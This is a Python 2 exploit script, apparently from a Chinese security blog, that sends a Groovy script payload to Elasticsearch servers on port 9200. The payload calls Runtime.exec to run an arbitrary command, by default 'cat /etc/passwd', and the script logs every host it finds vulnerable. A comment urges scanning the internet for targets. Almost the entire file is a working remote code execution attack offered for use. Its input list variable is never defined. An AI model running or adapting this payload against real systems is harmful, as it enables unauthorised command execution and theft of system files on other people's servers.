#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2015/3/14
# Created by 独自等待
# 博客 http://www.waitalone.cn/
import os, sys, re

try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')
def elastic(cmd):
    """
    Elastic search 命令执行函数
    漏洞详情:http://zone.wooyun.org/content/18915
    测试案例:请自行扫描9200端口的网站吧。
    """
    results = []
    elastic_url = 'http://'+url + ':9200/_search?pretty'
    exp = '{"size":1,"script_fields": ' \
          '{"iswin": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
          '.getRuntime().exec(\\"' + cmd + '\\").getText()","lang": "groovy"}}}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    # print exp
    try:
        content = requests.post(elastic_url, data=exp, headers=headers, timeout=10).content
    except Exception:
        print '%s no vul'%url.strip()
        #raise SystemExit
    else:
        result = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
        if result:
            results.append(result[0])
    return results


if __name__ == '__main__':
    cmd="cat /etc/passwd"

    fileHandle = open('es.txt','a+')
    for target in fobj:
        url=target.strip()
        print url
        command = elastic(cmd)
        if command:
            str = command[0].replace('\\n', '\n').replace('\\r','').replace('\\\\','\\')
            if(str.find("root")==-1):
               print "may be window"
            else:
                print "%s is vul"%target.strip()
                fileHandle.write(target)
        else:
            print ''
